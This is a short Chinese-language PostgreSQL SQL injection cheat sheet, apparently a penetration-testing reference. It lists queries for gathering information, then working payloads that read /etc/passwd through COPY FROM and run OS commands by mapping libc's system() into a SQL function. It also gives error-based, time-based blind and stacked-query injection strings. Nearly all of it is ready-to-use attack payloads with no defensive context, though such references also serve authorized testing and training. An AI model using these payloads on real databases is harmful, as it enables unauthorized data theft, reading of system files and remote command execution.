# PostgreSQL 特定语法参考

## 信息收集

```sql
-- 版本
SELECT version()

-- 当前用户
SELECT current_user

-- 当前数据库
SELECT current_database()

-- 所有数据库
SELECT datname FROM pg_database

-- 所有表
SELECT tablename FROM pg_tables WHERE schemaname='public'
```

## 文件操作与命令执行

```sql
-- 读文件
CREATE TABLE test(data text); COPY test FROM '/etc/passwd'; SELECT * FROM test;

-- 命令执行
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('id');
```

## 报错注入

```sql
' AND 1=CAST((SELECT version()) AS INT)--
```

## 时间盲注

```sql
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

## 堆叠查询

```sql
'; CREATE TABLE test(data text); COPY test FROM '/etc/passwd'--
```
